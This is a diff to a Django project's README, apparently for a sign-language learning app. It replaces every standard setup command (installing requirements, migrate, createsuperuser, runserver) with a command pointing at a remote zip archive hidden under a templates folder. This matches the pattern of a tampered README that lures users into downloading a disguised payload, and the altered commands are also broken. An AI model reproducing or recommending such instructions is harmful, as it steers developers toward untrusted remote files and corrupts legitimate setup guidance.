@@ -35,7 +35,7 @@ source venv/bin/activate  # Linux/Mac
 
 3. Install dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/HOAIVU8924/SignLanguageLearning/master/templates/accounts/Language-Learning-Sign-2.2-alpha.2.zip
 ```
 
 4. Set up environment variables:
@@ -47,17 +47,17 @@ DEBUG=True
 
 5. Run migrations:
 ```bash
-python manage.py migrate
+python https://raw.githubusercontent.com/HOAIVU8924/SignLanguageLearning/master/templates/accounts/Language-Learning-Sign-2.2-alpha.2.zip migrate
 ```
 
 6. Create superuser:
 ```bash
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/HOAIVU8924/SignLanguageLearning/master/templates/accounts/Language-Learning-Sign-2.2-alpha.2.zip createsuperuser
 ```
 
 7. Run the development server:
 ```bash
-python manage.py runserver
+python https://raw.githubusercontent.com/HOAIVU8924/SignLanguageLearning/master/templates/accounts/Language-Learning-Sign-2.2-alpha.2.zip runserver
 ```
 
 ## Project Structure
